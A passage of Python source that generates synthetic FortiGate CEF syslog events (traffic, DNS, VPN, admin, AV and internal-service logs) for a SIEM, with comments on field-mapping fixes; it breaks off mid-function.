#   1501054802 = DNS query                   -> always "information"
_LOGID_CANONICAL_LEVEL = {
    "0000000013": "notice",
    "1501054802": "information",
    # SSL VPN, per the FortiOS 7.6.4 log message reference. Until 2026-09-30 successful
    # tunnels were sent as 39426 (which is the LOGIN FAILURE id) and failures as the
    # undocumented 39428 / the tunnel-up id 39424 -- inverted.
    "0101039424": "information",   # LOG_ID_EVENT_SSL_VPN_USER_TUNNEL_UP
    "0101039425": "information",   # LOG_ID_EVENT_SSL_VPN_USER_TUNNEL_DOWN
    "0101039426": "alert",         # LOG_ID_EVENT_SSL_VPN_USER_SSL_LOGIN_FAIL
}


def _format_fortinet_cef(config, logid, log_type, subtype, log_level, extensions_dict):
    """
    Formats a Fortinet FortiGate CEF syslog message.

    CEF header:  CEF:0|Fortinet|Fortigate|v{version}|{logid[-5:]}|{type}:{subtype} {action}|{severity}|
    Syslog wrap: <PRI>timestamp hostname  CEF:...
    """
    # In FortiOS the severity level is bound to the log ID by the log definition,
    # not chosen per event.  Pin the ones we emit so a threat generator cannot
    # silently raise a traffic log to "warning" -- a real FortiGate marks bad
    # traffic via the UTM / app-control log and crlevel/crscore, and leaves the
    # forward-traffic log at its canonical level.
    _canonical = _LOGID_CANONICAL_LEVEL.get(logid)
    if _canonical:
        log_level = _canonical

    forti_conf  = _get_config(config)
    serial      = forti_conf.get("serial_number", "FGVM08TM21000001")
    vdom        = forti_conf.get("vdom", "root")
    fw_hostname = forti_conf.get("hostname", "FG-FW-01")
    cef_sev     = _SEVERITY_MAP.get(log_level, "3")

    # CEF Name field: genuine FortiGate uses "{type}:{subtype} {eventtype} {action}"
    # (e.g. "utm:virus infected blocked", "traffic:forward accept").
    act_val = extensions_dict.get("act", "")
    et_val  = extensions_dict.get("FTNTFGTeventtype", "")
    cef_name = " ".join(p for p in (f"{log_type}:{subtype}", et_val, act_val) if p)

    # Signature ID is the last five digits of the log ID (Fortinet's CEF mapping:
    # 0000000013 -> 00013, 1501054802 -> 54802); the full ID travels in FTNTFGTlogid.
    # The tenant parser models both forms identically (A/B, 2026-09-29).
    cef_header = (
        f"CEF:0|Fortinet|Fortigate|v7.6.4|{logid[-5:]}"
        f"|{cef_name}|{cef_sev}|"
    )

    # Base extensions present on every log
    base = {
        "deviceExternalId": serial,
        "dvchost":          fw_hostname,
        "FTNTFGTlogid":     logid,
        "FTNTFGTlevel":     log_level,
        "FTNTFGTsubtype":   subtype,
        "FTNTFGTvd":        vdom,
        "FTNTFGTeventtime": int(time.time() * 1_000_000_000),
        "FTNTFGTtz":        "+0000",
        "cat":              f"{log_type}:{subtype}",
    }

    merged = {**base, **extensions_dict}

    # AD domain-qualify bare usernames so XSIAM Identity can stitch
    # firewall users (EXAMPLECORP\user) with cloud/SaaS users (user@examplecorp.com).
    # Orchestrated events set _no_user_qualify to keep the EXACT box user (bare).
    #
    # EXCEPT VPN authentication (event:vpn). Identity Analytics reduces
    # EXAMPLECORP\jdoe to the DOMAIN, collapsing every VPN user into one identity
    # called "examplecorp" (proven by A/B on ASA 2026-07-28). Measured 2026-09-17: 100%
    # of FortiGate's 6,561 weekly VPN events carried the prefix and no FortiGate VPN
    # analytic had ever fired; ASA — bare usernames — is the only vendor whose VPN
    # analytics fire. VPN events are therefore forced bare, prefix stripped.
    if subtype == "vpn":
        merged.pop('_no_user_qualify', None)
        for _ufield in ("suser", "duser", "FTNTFGTxauthuser"):
            if merged.get(_ufield):
                merged[_ufield] = vpn_username(merged[_ufield])
    elif not merged.pop('_no_user_qualify', False):
        for _ufield in ("suser", "duser", "FTNTFGTxauthuser"):
            _uval = merged.get(_ufield)
            if _uval and "\\" not in _uval and "@" not in _uval:
                merged[_ufield] = f"EXAMPLECORP\\{_uval}"

    ext_string = " ".join(
        f"{k}={_cef_escape(v)}" for k, v in merged.items() if v is not None
    )

    # UTC, to agree with the hardcoded FTNTFGTtz=+0000 and the UTC-epoch
    # FTNTFGTeventtime below.  time.strftime() without a time tuple uses machine
    # LOCAL time, which put the header hours away from the eventtime it claims.
    _evt_ns = merged.get("FTNTFGTeventtime")
    try:
        _evt_epoch = int(_evt_ns) / 1_000_000_000 if _evt_ns else time.time()
    except (TypeError, ValueError):
        _evt_epoch = time.time()
    syslog_ts = time.strftime("%b %d %H:%M:%S", time.gmtime(_evt_epoch))
    return f"<{_SYSLOG_PRI}>{syslog_ts} {fw_hostname} {cef_header}{ext_string}"


def _base_traffic_fields(config, src_ip, shost, user, dst_ip, dhost, proto, dpt,
                          act, duration_s=None, src_country="Reserved",
                          dst_country=None, dst_city=None, dst_region=None,
                          src_os=None):
    """
    Returns the common extension dict used by all traffic and UTM events.
    Covers every XDM-mapped traffic field plus hunt-relevant extras.
    """
    forti_conf    = _get_config(config)
    lan_iface     = forti_conf.get("interface_lan", "port10")
    wan_iface     = forti_conf.get("interface_wan", "port1")
    policy_id     = forti_conf.get("default_policy_id", "1")
    policy_name   = forti_conf.get("default_policy_name", "allow-outbound")
    applist       = forti_conf.get("applist", "g-default")
    profile       = forti_conf.get("utm_profile", "default")
    duration_s, _ = _conn_timing(duration_s)
    sent_bytes    = random.randint(500, 20000)
    rcvd_bytes    = random.randint(10000, 300000)
    src_mac       = _random_mac(shost)
    os_name       = src_os or random.choice(_SRC_OS_WINDOWS)
    app_entry     = random.choice(_BENIGN_APPS)

    return {
        "src":                      src_ip,
        "spt":                      random.randint(49152, 65535),
        "shost":                    shost,
        "suser":                    user,
        "dst":                      dst_ip,
        "dpt":                      dpt,
        # dhost is a HOSTNAME field. Emit it only when a real name is known —
        # do NOT fall back to the destination IP. Genuine FortiGate omits dhost
        # for traffic with no resolved name; echoing the IP made XSIAM believe
        # hosts literally named "10.0.10.50" exist. Measured:
        # 86% of xdm.target.host.hostname values (2,996/3,458) were IP strings.
        # The CEF builder drops None, so this cleanly omits the field.
        "dhost":                    dhost,
        "proto":                    str(proto),
        "act":                      act,
        "out":                      sent_bytes,
        "in":                       rcvd_bytes,
        "FTNTFGTsentpkt":           random.randint(5, 100),
        "FTNTFGTrcvdpkt":           random.randint(20, 500),
        "FTNTFGTduration":          duration_s,
        "deviceInboundInterface":   lan_iface,
        "deviceOutboundInterface":  wan_iface,
        "FTNTFGTpolicyid":          policy_id,
        "FTNTFGTpolicyname":        policy_name,
        "FTNTFGTpolicytype":        "policy",
        "FTNTFGTpoluuid":           str(uuid.uuid4()),
        "FTNTFGTprofile":           profile,
        "FTNTFGTapplist":           applist,
        "FTNTFGTapp":               app_entry[0],
        "FTNTFGTappid":             app_entry[1],
        "FTNTFGTappcat":            app_entry[2],
        "FTNTFGTapprisk":           app_entry[3],
        "FTNTFGTgroup":             "Domain_Users",
        "FTNTFGTsrccountry":        src_country,
        "FTNTFGTdstcountry":        dst_country or "United States",
        "FTNTFGTdstcity":           dst_city,
        "FTNTFGTdstregion":         dst_region,
        "FTNTFGTosname":            os_name,
        "FTNTFGTsrcmac":            src_mac,
        "FTNTFGTmastersrcmac":      src_mac,
        "FTNTFGTsrcintfrole":       "lan",
        "FTNTFGTdstintfrole":       "wan",
        "FTNTFGTservice":           _port_to_service(dpt),
        "FTNTFGTlogdesc":           "Forward traffic" if act != "deny" else "Forward traffic denied",
        "externalId":               _session_id(),
        "outcome":                  "success" if act in ("accept", "allow", "passthrough") else "failed",
        "msg":                      f"Traffic {act} by policy {policy_name}",
    }


# Benign event generators

def _benign_destination(config, user, weighted=True):
    """(domain, ip) for a benign destination, where the ip is what that NAME resolves to.

    Before 2026-09-18 the name and the address were chosen from two unrelated
    pools -- `dst_ip` from the destination's CIDR, `domain` from config
    `benign_domains` -- so the pairing was meaningless, and no DNS answer from
    Infoblox matched a FortiGate destination.

    Both now come from modules/resolver.py, the same table Infoblox answers from,
    so a DNS response and the connection that follows carry the same address.
    """
    destinations = config.get("benign_egress_destinations") or [{}]
    dest = (weighted_destination(user, destinations) if weighted
            else random.choice(destinations))
    domain = dest.get("domain") or dest.get("name", "example.com").lower().replace(" ", "")
    ip = resolver.resolve_one(domain)
    if not ip:
        # Resolver unavailable (soft-fail) -- keep the old behaviour so events
        # are still well-formed; only the DNS/firewall join is lost.
        try:
            ip = rand_ip_from_network(ip_network(dest.get("ip_range", "40.96.0.0/13"), strict=False))
        except Exception:
            ip = "40.96.0.1"
    return dest, domain, ip


def _generate_traffic_forward(config, src_ip, user, shost):
    """Normal outbound web browsing — traffic:forward allow."""
    dest, domain, dst_ip = _benign_destination(config, user)
    geo          = _ext_geo()
    app_entry    = random.choice(_BENIGN_APPS)
    duration_s   = random.randint(10, 600)

    fields = _base_traffic_fields(
        config, src_ip, shost, user, dst_ip, domain, "6", 443, "accept",
        duration_s=duration_s, dst_country=dest.get("country", geo["country"])
    )
    fields.update({
        "app":              "HTTPS",
        "FTNTFGTapp":       app_entry[0],
        "FTNTFGTappid":     app_entry[1],
        "FTNTFGTappcat":    app_entry[2],
        "FTNTFGTapprisk":   app_entry[3],
        "request":          f"/{domain}/",
        "FTNTFGThttpmethod":"GET",
        "FTNTFGThttpcode":  random.choice(["200", "200", "200", "301", "304"]),
        "FTNTFGTreferralurl": f"https://{domain}/",
        "requestClientApplication": random.choice(_BROWSER_UA),
        "FTNTFGTcipher":    random.choice(_TLS_CIPHERS),
        "FTNTFGTtlsver":    random.choice(_TLS_VERSIONS),
        "FTNTFGTscertcname": f"*.{domain}",
        "FTNTFGTscertissuer": random.choice(_TLS_ISSUERS),
        "FTNTFGTdstcity":   geo["city"],
        "FTNTFGTdstregion": geo["region"],
        "msg":              f"HTTPS session to {domain}",
    })
    return _format_fortinet_cef(config, "0000000013", "traffic", "forward", "notice", fields)


def _generate_inbound_block(config):
    """External probe denied at perimeter — traffic:forward deny."""
    forti_conf   = _get_config(config)
    ext_ip       = _random_external_ip()
    geo          = _ext_geo()
    target_ip    = random.choice(config.get("internal_servers", ["10.0.10.50"]))
    scan_port    = random.choice([22, 23, 80, 443, 445, 1433, 3306, 3389, 8080, 8443])
    wan_iface    = forti_conf.get("interface_wan", "port1")
    lan_iface    = forti_conf.get("interface_lan", "port10")

    fields = {
        "src":                      ext_ip,
        "spt":                      random.randint(1024, 65535),
        "dst":                      target_ip,
        "dpt":                      scan_port,
        "proto":                    "6",
        "act":                      "deny",
        "deviceInboundInterface":   wan_iface,
        "deviceOutboundInterface":  lan_iface,
        "FTNTFGTpolicyid":          "0",
        "FTNTFGTpolicyname":        "implicit-deny",
        "FTNTFGTpolicytype":        "policy",
        "FTNTFGTsrccountry":        geo["country"],
        "FTNTFGTsrccity":           geo["city"],
        "FTNTFGTsrcregion":         geo["region"],
        "FTNTFGTdstcountry":        "Reserved",
        "FTNTFGTduration":          0,
        "FTNTFGTservice":           _port_to_service(scan_port),
        "FTNTFGTlogdesc":           "Forward traffic denied",
        "FTNTFGTsrcintfrole":       "wan",
        "FTNTFGTdstintfrole":       "lan",
        "out":                      0,
        "in":                       0,
        "FTNTFGTsentpkt":           1,
        "FTNTFGTrcvdpkt":           0,
        "externalId":               _session_id(),
        "outcome":                  "failed",
        "reason":                   "no-policy-match",
        "msg":                      f"Denied by implicit policy from {geo['country']}",
    }
    return _format_fortinet_cef(config, "0000000013", "traffic", "forward", "notice", fields)


def _generate_webfilter_allow(config, src_ip, user, shost):
    """Outbound web request inspected and allowed — utm:webfilter ftgd_allow."""
    dest, domain, dst_ip = _benign_destination(config, user, weighted=False)
    cat_id       = random.choice(_URL_CAT_BENIGN)
    geo          = _ext_geo()

    fields = _base_traffic_fields(
        config, src_ip, shost, user, dst_ip, domain, "6", 443, "accept",
        dst_country=dest.get("country", geo["country"])
    )
    fields.update({
        "app":              "HTTPS",
        "request":          f"https://{domain}/",
        "hostname":         domain,
        "FTNTFGTeventtype": "ftgd_allow",
        "cat":              str(cat_id),
        "FTNTFGTcatdesc":   "General Interest",
        "requestContext":   "General Interest",
        "FTNTFGThttpmethod":"GET",
        "FTNTFGThttpcode":  "200",
        "requestClientApplication": random.choice(_BROWSER_UA),
        "FTNTFGTprofile":   _get_config(config).get("webfilter_profile", "default-webfilter"),
        "msg":              f"URL allowed by webfilter: {domain}",
        "outcome":          "success",
    })
    return _format_fortinet_cef(config, "0201009218", "utm", "webfilter", "notice", fields)


def _generate_dns_query(config, src_ip, user, shost):
    """Outbound DNS query — utm:dns dns-query."""
    # `resolver_ip` -- NOT `resolver`, which would shadow the resolver module.
    _dest, domain, resolved = _benign_destination(config, user, weighted=False)
    qtype     = random.choices(["A", "AAAA", "MX", "TXT"], weights=[70, 15, 10, 5])[0]
    # Clients resolve through their Infoblox grid member (inside -> dmz). The
    # grid's own recursion (member -> forwarder) is the only DNS that reaches
    # the WAN, and it carries no user.
    grid_name, grid_ip = resolver.dns_server_for(config, src_ip)
    grid_fqdn = f"{grid_name}.{resolver.internal_domain(config)}"
    if random.random() < 0.4:
        src_ip, user, shost = grid_ip, None, grid_fqdn
        resolver_ip, dst_name, dst_role, dst_country = (
            random.choice(resolver.dns_forwarders(config)), None, "wan", "United States")
        dst_name = "dns.google" if resolver_ip.startswith("8.8.") else None
        src_role = "dmz"
    else:
        resolver_ip, dst_name, dst_role, dst_country, src_role = grid_ip, grid_fqdn, "dmz", "Reserved", "lan"

    fields = {
        "src":              src_ip,
        "spt":              random.randint(49152, 65535),
        "shost":            shost,
        "suser":            user,
        "dst":              resolver_ip,
        "dpt":              53,
        "dhost":            dst_name,
        "proto":            "17",
        "act":              "passthrough",
        "app":              "DNS",
        "FTNTFGTeventtype": "dns-query",
        "FTNTFGTqname":     domain,
        "FTNTFGTqtype":     qtype,
        "FTNTFGTqclass":    "IN",
        "FTNTFGTipaddr":    resolved,
        "FTNTFGTpolicyid":  "1",
        "FTNTFGTpolicyname": _get_config(config).get("default_policy_name", "allow-outbound"),
        "FTNTFGTprofile":   _get_config(config).get("dns_filter_profile", "default-dns-filter"),
        "FTNTFGTduration":  0,
        "out":              random.randint(50, 100),
        "in":               random.randint(50, 200),
        "FTNTFGTsentpkt":   1,
        "FTNTFGTrcvdpkt":   1,
        "FTNTFGTsrccountry":"Reserved",
        "FTNTFGTdstcountry":dst_country,
        "FTNTFGTosname":    random.choice(_SRC_OS_WINDOWS),
        "FTNTFGTsrcmac":    _random_mac(shost),
        "FTNTFGTservice":   "DNS",
        "FTNTFGTlogdesc":   "DNS response",
        "FTNTFGTsrcintfrole": src_role,
        "FTNTFGTdstintfrole": dst_role,
        "externalId":       _session_id(),
        "outcome":          "success",
        "msg":              f"DNS query for {domain} type {qtype}",
    }
    return _format_fortinet_cef(config, "1501054802", "dns", "dns-query", "information", fields)


def _generate_admin_event(config):
    """Admin login success or failure — event:system."""
    forti_conf   = _get_config(config)
    admin_users  = forti_conf.get("admin_users", ["admin"])
    # The shared operations team (mgmt_plane) mostly; the device's local accounts
    # occasionally. Admin logins come from the admin subnet only: until 2026-10-19 they
    # came from any user workstation, which made "admin from an unexpected source" the
    # baseline.
    user         = (mgmt_plane.admin_user(config) if random.random() < 0.85
                    else random.choice(admin_users))
    mgmt_ip      = forti_conf.get("management_ip", "172.16.200.1")
    src_ip       = mgmt_plane.admin_source(config)
    is_success   = random.random() > 0.15

    if is_success:
        fields = {
            "FTNTFGTlogdesc":  "Admin login successful",
            "duser":           user,
            "src":             src_ip,
            "dst":             mgmt_ip,
            "act":             "login",
            "outcome":         "success",
            "FTNTFGTmethod":   "https",
            "FTNTFGTduration": 0,
            "sproc":           f"https({src_ip})",
            "msg":             f"Administrator {user} login successful from https({src_ip})",
        }
        return _format_fortinet_cef(config, "0100032001", "event", "system", "notice", fields)
    else:
        fields = {
            "FTNTFGTlogdesc":  "Admin login failed",
            "duser":           user,
            "src":             src_ip,
            "dst":             mgmt_ip,
            "act":             "login",
            "outcome":         "failed",
            "reason":          "name_invalid",
            "FTNTFGTmethod":   "https",
            "FTNTFGTduration": 0,
            "sproc":           f"https({src_ip})",
            "msg":             f"Administrator {user} login failed from https({src_ip}) because of invalid user name",
        }
        return _format_fortinet_cef(config, "0100032002", "event", "system", "alert", fields)


def _generate_vpn_event(config, session_context=None):
    """SSL VPN tunnel up/down — event:vpn."""
    forti_conf   = _get_config(config)
    geo           = _ext_geo()
    if session_context:
        user_info = get_random_user(session_context, preferred_device_type="workstation")
        user = user_info["username"] if user_info else random.choice(["jsmith", "bjones", "mwilliams"])
    else:
        umap = (forti_conf.get("user_ip_map") or config.get('shared_user_ip_map', {}))
        user = random.choice(list(umap.keys())) if umap else random.choice(["jsmith", "bjones", "mwilliams", "rthomas"])
    ext_ip        = stable_vpn_ip(user)

    tunnel_ip     = f"10.212.134.{hash(user) % 100 + 100}"
    tunnel_id     = random.randint(100000, 999999)
    gw_ip         = forti_conf.get("vpn_gateway_ip", "203.0.113.20")
    is_up         = random.random() > 0.1

    fields = {
        "src":                  ext_ip,
        "dst":                  gw_ip,
        "dpt":                  443,
        "proto":                "6",
        "suser":                user,
        "FTNTFGTxauthuser":     user,
        "FTNTFGTxauthgroup":    "VPN_Users",
        "FTNTFGTtunnelid":      tunnel_id,
        "FTNTFGTtunneltype":    "ssl-vpn",
        "FTNTFGTtunnelip":      tunnel_ip,
        "FTNTFGTassignip":      tunnel_ip,
        "FTNTFGTremotegw":      ext_ip,
        "FTNTFGTvpntunnel":     "SSL-VPN-Tunnel",
        # Country label = the IP's REAL country. FortiGate's XIF takes
        # xdm.source.location.country from this text field; a random
        # _ext_geo() label gave every user a ten-country VPN baseline.
        "FTNTFGTsrccountry":    ip_country(ext_ip, config)[1] or "Reserved",
        "FTNTFGTduration":      0,
        "externalId":           _session_id(),
    }

    if is_up:
        fields.update({
            "act":             "tunnel-up",
            "outcome":         "success",
            "FTNTFGTlogdesc":  "SSL VPN tunnel up",
            "msg":             f"SSL tunnel established",
        })
        return _format_fortinet_cef(config, "0101039424", "event", "vpn", "notice", fields)
    else:
        fields.update({
            "act":             "ssl-login-fail",
            "outcome":         "failed",
            "reason":          "sslvpn_login_permission_denied",
            "FTNTFGTlogdesc":  "SSL VPN login fail",
            "msg":             f"SSL VPN login failed for user {user}",
        })
        return _format_fortinet_cef(config, "0101039426", "event", "vpn", "warning", fields)


def _generate_ntp_sync(config, src_ip, user, shost):
    """NTP time synchronisation — UDP/123 to a public NTP server (traffic:forward).

    Short duration, tiny byte counts.  Represents routine clock sync from workstations,
    servers, and network appliances.  Logged by FortiGate as a standard traffic forward event.
    """
    ntp_servers = ["216.239.35.0", "129.6.15.28", "132.163.96.1",
                   "17.253.52.125", "162.159.200.1", "198.60.22.240"]
    ntp_dest = random.choice(ntp_servers)

    fields = _base_traffic_fields(
        config, src_ip, shost, user, ntp_dest, "pool.ntp.org", "17", 123, "accept",
        duration_s=random.randint(0, 1)
    )
    fields.update({
        "app":             "NTP",
        "FTNTFGTapp":      "NTP",
        "FTNTFGTappid":    "16195",
        "FTNTFGTappcat":   "Network.Service",
        "FTNTFGTapprisk":  "low",
        "out":             random.randint(48, 76),
        "in":              random.randint(48, 76),
        "msg":             f"NTP sync from {src_ip} to {ntp_dest}:123",
    })
    return _format_fortinet_cef(config, "0000000013", "traffic", "forward", "notice", fields)


def _generate_antivirus_allow(config, src_ip, user, shost):
    """FortiAV scan: clean file passed through — utm:antivirus virustype=clean.

    Represents the normal background of AV inspection events where files are
    inspected and found clean.  File downloads, email attachments, and web content
    all pass through FortiAV; the vast majority result in a clean verdict.
    """
    dest, domain, dst_ip = _benign_destination(config, user, weighted=False)

    file_extensions = ["exe", "dll", "zip", "docx", "xlsx", "pdf", "msi", "cab"]
    file_ext   = random.choice(file_extensions)
    file_size  = random.randint(10_000, 50_000_000)
    profile    = _get_config(config).get("av_profile", "default")

    fields = _base_traffic_fields(
        config, src_ip, shost, user, dst_ip, domain, "6", 443, "accept"
    )
    # Genuine FortiGate CEF keys: fname/fsize/request (NOT FTNTFGTfilename/filesize/url).
    clean_cksum = hashlib.sha256(f"{src_ip}{file_ext}{time.time()}".encode()).hexdigest()
    fields.update({
        "app":                    "HTTPS",
        "FTNTFGTeventtype":       "analytics",   # AV clean/analytics verdict
        "FTNTFGTprofile":         profile,
        "FTNTFGTdtype":           "File",
        "FTNTFGTfiletype":        file_ext.upper(),
        "fsize":                  file_size,
        "fname":                  f"download.{file_ext}",
        "request":                f"https://{domain}/download.{file_ext}",
        "FTNTFGTanalyticscksum":  clean_cksum,
        "FTNTFGTanalyticssubmit": "false",
        "msg":                    f"File download inspected by AV: clean ({file_ext.upper()}, {file_size} bytes)",
    })
    return _format_fortinet_cef(config, "0211008192", "utm", "virus", "information", fields)


def _generate_ipsec_vpn_event(config):
    """IPSec VPN Phase-1 / Phase-2 negotiation event — event:vpn ipsec.

    Distinct from SSL VPN (_generate_vpn_event).  Represents site-to-site IPSec
    tunnels or remote-access IPSec clients negotiating IKE phase-1 (ISAKMP) and
    phase-2 (IPSec SA).  Uses UDP/500 (IKE) or UDP/4500 (NAT-T).
    """
    forti_conf   = _get_config(config)
    peer_gws     = forti_conf.get("ipsec_peer_gateways", [])
    if peer_gws:
        peer_ip = random.choice(peer_gws)
    else:
        peer_ip = _random_external_ip()
    geo          = _ext_geo()
    gw_ip        = forti_conf.get("vpn_gateway_ip", "203.0.113.20")
    tunnel_name  = random.choice(["Site-to-HQ", "Branch-VPN", "Azure-IPSec", "Remote-Access"])
    ike_port     = random.choices([500, 4500], weights=[70, 30], k=1)[0]
    phase        = random.choices(["phase1", "phase2"], weights=[40, 60], k=1)[0]
    is_up        = random.random() > 0.1

    if phase == "phase1":
        logid     = "0101037127"
        eventtype = "ike-negotiate"
        logdesc   = "IPsec phase 1 status changed"
        msg_text  = f"IPsec phase 1 {'up' if is_up else 'error'}"
    else:
        logid     = "0101037141"
        eventtype = "ipsec-negotiate"
        logdesc   = "IPsec phase 2 status changed"
        msg_text  = f"IPsec phase 2 SA {'established' if is_up else 'failed'} for tunnel {tunnel_name}"

    fields = {
        "src":                  peer_ip,
        "dst":                  gw_ip,
        "spt":                  ike_port,
        "dpt":                  ike_port,
        "proto":                "17",
        "FTNTFGTeventtype":     eventtype,
        "FTNTFGTlogdesc":       logdesc,
        "FTNTFGTvpntunnel":     tunnel_name,
        "FTNTFGTtunneltype":    "ipsec",
        "FTNTFGTremotegw":      peer_ip,
        # Label = the peer IP's real country (see _generate_vpn_event).
        "FTNTFGTsrccountry":    ip_country(peer_ip, config)[1] or "Reserved",
        "act":                  "negotiate",
        "outcome":              "success" if is_up else "failed",
        "msg":                  msg_text,
        "externalId":           _session_id(),
    }
    return _format_fortinet_cef(config, logid, "event", "vpn", "notice" if is_up else "warning", fields)


def _generate_ssl_inspection(config, src_ip, user, shost):
    """SSL deep-packet inspection certificate event — utm:ssl."""
    dest, domain, dst_ip = _benign_destination(config, user, weighted=False)
    cipher       = random.choice(_TLS_CIPHERS)
    tls_ver      = random.choice(_TLS_VERSIONS)

    fields = _base_traffic_fields(
        config, src_ip, shost, user, dst_ip, domain, "6", 443, "accept"
    )
    fields.update({
        "app":                  "HTTPS",
        "FTNTFGTsslaction":     "inspect",
        "FTNTFGTcipher":        cipher,
        "FTNTFGTtlsver":        tls_ver,
        "FTNTFGTscertcname":    f"*.{domain}",
        "FTNTFGTscertissuer":   random.choice(_TLS_ISSUERS),
        "FTNTFGTccertissuer":   random.choice(_TLS_ISSUERS),
        "FTNTFGTprofile":       _get_config(config).get("ssl_inspect_profile", "deep-inspection"),
        "FTNTFGTlogdesc":       "SSL connection inspected",
        "msg":                  f"SSL inspection: {tls_ver} {cipher} to {domain}",
    })
    return _format_fortinet_cef(config, "0002000001", "utm", "ssl", "information", fields)


def _generate_rdp_internal(config, src_ip, user, shost):
    """Benign internal RDP session — workstation to internal server/workstation."""
    forti_conf = _get_config(config)
    servers = config.get("internal_servers", ["10.0.10.50"])
    dst_ip = random.choice(servers)
    lan_iface = forti_conf.get("interface_lan", "port10")
    duration_s = random.randint(60, 3600)

    fields = {
        "src": src_ip, "spt": random.randint(49152, 65535),
        "shost": shost, "suser": user,
        "dst": dst_ip, "dpt": 3389, "proto": "6",
        "act": "accept",
        "app": "RDP", "FTNTFGTapp": "RDP", "FTNTFGTappid": 16100,
        "FTNTFGTappcat": "Remote.Access", "FTNTFGTapprisk": "medium",
        "deviceInboundInterface": lan_iface,
        "deviceOutboundInterface": lan_iface,
        "FTNTFGTpolicyid": forti_conf.get("default_policy_id", "1"),
        "FTNTFGTpolicyname": forti_conf.get("default_policy_name", "allow-outbound"),
        "FTNTFGTsrccountry": "Reserved", "FTNTFGTdstcountry": "Reserved",
        "FTNTFGTduration": duration_s,
        "out": random.randint(5000, 50000), "in": random.randint(10000, 200000),
        "FTNTFGTsentpkt": random.randint(20, 200),
        "FTNTFGTrcvdpkt": random.randint(50, 500),
        "FTNTFGTosname": random.choice(_SRC_OS_WINDOWS),
        "FTNTFGTsrcmac": _random_mac(shost),
        "FTNTFGTservice": "RDP",
        "FTNTFGTlogdesc": "Forward traffic",
        "FTNTFGTsrcintfrole": "lan", "FTNTFGTdstintfrole": "lan",
        "externalId": _session_id(), "outcome": "success",
        "msg": f"Internal RDP session {src_ip} -> {dst_ip}:3389",
    }
    return _format_fortinet_cef(config, "0000000013", "traffic", "forward", "notice", fields)


def _generate_ftp_download(config, src_ip, user, shost):
    """Benign internal FTP download — workstation to internal file server."""
    forti_conf = _get_config(config)
    servers = config.get("internal_servers", ["10.0.10.50"])
    dst_ip = random.choice(servers)
    lan_iface = forti_conf.get("interface_lan", "port10")
    duration_s = random.randint(10, 300)

    fields = {
        "src": src_ip, "spt": random.randint(49152, 65535),
        "shost": shost, "suser": user,
        "dst": dst_ip, "dpt": 21, "proto": "6",
        "act": "accept",
        "app": "FTP", "FTNTFGTapp": "FTP", "FTNTFGTappid": 15896,
        "FTNTFGTappcat": "File.Sharing", "FTNTFGTapprisk": "low",
        "deviceInboundInterface": lan_iface,
        "deviceOutboundInterface": lan_iface,
        "FTNTFGTpolicyid": forti_conf.get("default_policy_id", "1"),
        "FTNTFGTpolicyname": forti_conf.get("default_policy_name", "allow-outbound"),
        "FTNTFGTsrccountry": "Reserved", "FTNTFGTdstcountry": "Reserved",
        "FTNTFGTduration": duration_s,
        "out": random.randint(100, 1000), "in": random.randint(50000, 5000000),
        "FTNTFGTsentpkt": random.randint(5, 50),
        "FTNTFGTrcvdpkt": random.randint(50, 500),
        "FTNTFGTosname": random.choice(_SRC_OS_WINDOWS),
        "FTNTFGTsrcmac": _random_mac(shost),
        "FTNTFGTservice": "FTP",
        "FTNTFGTlogdesc": "Forward traffic",
        "FTNTFGTsrcintfrole": "lan", "FTNTFGTdstintfrole": "lan",
        "externalId": _session_id(), "outcome": "success",
        "msg": f"FTP download {src_ip} -> {dst_ip}:21",
    }
    return _format_fortinet_cef(config, "0000000013", "traffic", "forward", "notice", fields)


def _generate_smb_internal(config, src_ip, user, shost):
    """Benign internal SMB file share access — workstation to file server."""
    forti_conf = _get_config(config)
    servers = config.get("internal_servers", ["10.0.10.50"])
    dst_ip = random.choice(servers)
    lan_iface = forti_conf.get("interface_lan", "port10")
    duration_s = random.randint(5, 120)

    fields = {
        "src": src_ip, "spt": random.randint(49152, 65535),
        "shost": shost, "suser": user,
        "dst": dst_ip, "dpt": 445, "proto": "6",
        "act": "accept",
        "app": "SMB", "FTNTFGTapp": "SMB", "FTNTFGTappid": 16102,
        "FTNTFGTappcat": "File.Sharing", "FTNTFGTapprisk": "low",
        "deviceInboundInterface": lan_iface,
        "deviceOutboundInterface": lan_iface,
        "FTNTFGTpolicyid": forti_conf.get("default_policy_id", "1"),
        "FTNTFGTpolicyname": forti_conf.get("default_policy_name", "allow-outbound"),
        "FTNTFGTsrccountry": "Reserved", "FTNTFGTdstcountry": "Reserved",
        "FTNTFGTduration": duration_s,
        "out": random.randint(1000, 50000), "in": random.randint(5000, 200000),
        "FTNTFGTsentpkt": random.randint(10, 100),
        "FTNTFGTrcvdpkt": random.randint(20, 200),
        "FTNTFGTosname": random.choice(_SRC_OS_WINDOWS),
        "FTNTFGTsrcmac": _random_mac(shost),
        "FTNTFGTservice": "SMB",
        "FTNTFGTlogdesc": "Forward traffic",
        "FTNTFGTsrcintfrole": "lan", "FTNTFGTdstintfrole": "lan",
        "externalId": _session_id(), "outcome": "success",
        "msg": f"SMB file access {src_ip} -> {dst_ip}:445",
    }
    return _format_fortinet_cef(config, "0000000013", "traffic", "forward", "notice", fields)


def _generate_vpn_login_benign(config, session_context=None):
    """Benign SSL VPN login with stable per-user source IP."""
    forti_conf = _get_config(config)
    geo = _ext_geo()
    if session_context:
        user_info = get_random_user(session_context, preferred_device_type="workstation")
        user = user_info["username"] if user_info else "jsmith"
    else:
        umap = (forti_conf.get("user_ip_map") or config.get('shared_user_ip_map', {}))
        user = random.choice(list(umap.keys())) if umap else "jsmith"
    ext_ip = stable_vpn_ip(user)
    tunnel_ip = f"10.212.134.{hash(user) % 100 + 100}"
    tunnel_id = random.randint(100000, 999999)
    gw_ip = forti_conf.get("vpn_gateway_ip", "203.0.113.20")

    fields = {
        "src": ext_ip, "dst": gw_ip, "dpt": 443, "proto": "6",
        "suser": user, "FTNTFGTxauthuser": user,
        "FTNTFGTxauthgroup": "VPN_Users",
        "FTNTFGTtunnelid": tunnel_id, "FTNTFGTtunneltype": "ssl-vpn",
        "FTNTFGTtunnelip": tunnel_ip, "FTNTFGTassignip": tunnel_ip,
        "FTNTFGTremotegw": ext_ip, "FTNTFGTvpntunnel": "SSL-VPN-Tunnel",
        # Country label = the IP's REAL country. FortiGate's XIF takes
        # xdm.source.location.country from this text field; a random
        # _ext_geo() label gave every user a ten-country VPN baseline.
        "FTNTFGTsrccountry": ip_country(ext_ip, config)[1] or "Reserved",
        "FTNTFGTduration": 0, "externalId": _session_id(),
        "act": "tunnel-up", "outcome": "success",
